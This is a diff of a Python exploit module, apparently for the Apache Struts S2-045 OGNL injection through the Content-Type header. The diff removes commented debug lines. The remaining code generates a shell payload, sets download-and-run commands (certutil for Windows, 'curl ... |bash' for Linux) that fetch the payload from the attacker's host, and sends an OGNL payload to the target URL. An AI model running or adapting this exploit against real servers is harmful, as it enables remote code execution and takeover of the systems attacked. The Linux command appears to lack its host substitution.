@@ -40,28 +40,21 @@ class AS045:
 			port = self.rport
 			directory = self.directory # Struts Application directory
 			if self.osys == "1":
-#				print windows
 				shell = "windows"
 				ext = "exe"
 				venom(shell, ext)
-#				wshell(shell)
 				os.system('mv shelb shelb.exe')
 				global cmd
 				cmd = "certutil -urlcache -f -split http://%s/shelb.exe & shelb.exe" % self.lhost
 			if self.osys == "2":
-#				print linux
 				shell = "linux"
 				ext = "elf"
 				venom(shell, ext)
-#				wshell(shell)
-#				os.system('mv shelb shelb.elf')
 				global cmd
 				cmd = "curl http://%s/shelb |bash"
 
-#			cmd = self.command #System Command to be execute
 
 			URL = target + ':' + port + '/' + directory + '/'
-#			print(URL)
 
 			payload = "%{(#_='multipart/form-data')."
 			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -82,7 +75,6 @@ class AS045:
 			payload += "(#ros.flush())}"
 
 			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
-#			print(headers)
 #			r = requests.get(URL, headers=headers, proxies=proxies)
 
 			r = requests.get(URL, headers=headers)
